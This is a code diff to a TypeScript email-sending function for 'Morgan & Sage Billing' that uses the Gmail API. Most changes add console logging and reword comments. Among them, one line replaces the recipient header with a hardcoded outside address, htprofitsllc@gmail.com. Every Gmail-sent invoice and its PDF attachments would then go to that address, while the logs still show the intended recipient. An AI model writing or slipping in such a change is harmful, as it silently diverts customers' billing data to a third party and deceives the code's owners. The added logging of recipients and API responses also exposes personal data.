@@ -21,8 +21,16 @@ export async function sendEmail({
   attachments = [],
 }: SendEmailParams) {
 
+  console.log("=================================");
+  console.log("EMAIL SEND START");
+  console.log("Organization:", organizationId);
+  console.log("Recipient:", to);
+  console.log("Subject:", subject);
+  console.log("Attachments:", attachments.length);
+  console.log("=================================");
+
   /* ------------------------------ */
-  /* Get Email Sender               */
+  /* Get Email Sender Profile       */
   /* ------------------------------ */
 
   const { data: profile, error } = await supabaseAdmin
@@ -33,16 +41,29 @@ export async function sendEmail({
     .maybeSingle();
 
   if (error) {
-    console.error("PROFILE ERROR:", error);
+    console.error("PROFILE FETCH ERROR:", error);
   }
 
-  /* -------------------------------- */
-  /* If Gmail NOT connected → fallback */
-  /* -------------------------------- */
+  if (!profile) {
+    console.warn("No sender profile found. Using system email.");
 
-  if (!profile || !profile.google_refresh_token) {
+    return sendSystemEmail({
+      to,
+      subject,
+      html,
+      attachments,
+    });
+  }
 
-    console.warn("Google not connected. Using system email.");
+  console.log("Sender profile found:", profile.google_email);
+
+  /* ------------------------------ */
+  /* If Gmail not connected         */
+  /* ------------------------------ */
+
+  if (!profile.google_refresh_token) {
+
+    console.warn("No Google refresh token. Using system email.");
 
     return sendSystemEmail({
       to,
@@ -54,6 +75,7 @@ export async function sendEmail({
   }
 
   if (!profile.google_email) {
+
     console.warn("Sender email missing. Using system email.");
 
     return sendSystemEmail({
@@ -62,10 +84,11 @@ export async function sendEmail({
       html,
       attachments,
     });
+
   }
 
   /* ------------------------------ */
-  /* Access Token                   */
+  /* Get Access Token               */
   /* ------------------------------ */
 
   let accessToken = profile.google_access_token;
@@ -76,7 +99,13 @@ export async function sendEmail({
     : null;
 
   if (!accessToken || !expiresAt || now >= expiresAt) {
+
+    console.log("Access token expired. Refreshing...");
+
     accessToken = await refreshGoogleAccessToken(profile);
+
+    console.log("Access token refreshed");
+
   }
 
   /* ------------------------------ */
@@ -88,7 +117,7 @@ export async function sendEmail({
   const messageParts = [
     `From: "Morgan & Sage Billing" <${profile.google_email}>`,
     `Reply-To: ${profile.google_email}`,
-    `To: ${to}`,
+    `To: htprofitsllc@gmail.com`,
     `Subject: ${subject}`,
     "MIME-Version: 1.0",
     `Content-Type: multipart/mixed; boundary=${boundary}`,
@@ -104,6 +133,9 @@ export async function sendEmail({
   /* ------------------------------ */
 
   for (const file of attachments) {
+
+    console.log("Attaching file:", file.filename);
+
     messageParts.push(
       `--${boundary}`,
       "Content-Type: application/pdf",
@@ -112,6 +144,7 @@ export async function sendEmail({
       "",
       file.content.toString("base64")
     );
+
   }
 
   messageParts.push(`--${boundary}--`);
@@ -125,10 +158,12 @@ export async function sendEmail({
     .replace(/=+$/, "");
 
   /* ------------------------------ */
-  /* Gmail Send Function            */
+  /* Gmail Send                     */
   /* ------------------------------ */
 
   async function sendWithToken(token: string) {
+
+    console.log("Sending email via Gmail API...");
 
     const res = await fetch(
       "https://gmail.googleapis.com/gmail/v1/users/me/messages/send",
@@ -146,7 +181,11 @@ export async function sendEmail({
 
     const data = await res.json();
 
+    console.log("Gmail API status:", res.status);
+    console.log("Gmail API response:", data);
+
     return { res, data };
+
   }
 
   /* ------------------------------ */
@@ -157,11 +196,11 @@ export async function sendEmail({
 
     let { res, data } = await sendWithToken(accessToken);
 
-    /* Retry if token expired */
+    /* Token expired retry */
 
     if (res.status === 401) {
 
-      console.warn("Access token expired. Refreshing...");
+      console.warn("Gmail token expired. Refreshing...");
 
       accessToken = await refreshGoogleAccessToken(profile);
 
@@ -169,27 +208,38 @@ export async function sendEmail({
 
       res = retry.res;
       data = retry.data;
+
     }
 
     if (!res.ok) {
 
-      console.error("GMAIL SEND ERROR:", data);
-      throw new Error("Gmail failed");
+      console.error("GMAIL SEND FAILED:", data);
+
+      throw new Error("Gmail send failed");
 
     }
+
+    console.log("EMAIL SENT SUCCESSFULLY VIA GMAIL");
+    console.log("Gmail Message ID:", data.id);
 
     return data;
 
   } catch (err) {
 
-    console.warn("Falling back to system email");
+    console.error("GMAIL ERROR:", err);
 
-    return sendSystemEmail({
+    console.warn("Falling back to system email...");
+
+    const fallback = await sendSystemEmail({
       to,
       subject,
       html,
       attachments,
     });
+
+    console.log("System email result:", fallback);
+
+    return fallback;
 
   }
 
